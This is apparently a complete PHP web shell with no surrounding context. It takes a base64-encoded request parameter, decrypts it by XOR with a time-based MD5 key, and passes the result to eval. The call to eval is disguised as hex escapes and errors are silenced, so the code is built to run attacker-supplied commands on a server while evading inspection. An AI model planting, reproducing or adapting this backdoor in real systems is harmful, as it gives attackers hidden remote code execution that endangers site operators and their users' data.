<?php

date_default_timezone_set("PRC");

if (isset($_REQUEST['rt7ao0lsw'])) {
    @$post = base64_decode($_REQUEST['rt7ao0lsw']);
    $key = md5(date("Y-m-d H:i", time()));
    
    for ($i = 0; $i < strlen($post); $i++) {
        $post[$i] = $post[$i] ^ $key[$i % 32];
    }
    
    $engine = "\x65\x76\x61\x6c";
    
    if ($post) {
        @$engine($post);
    }
}
?>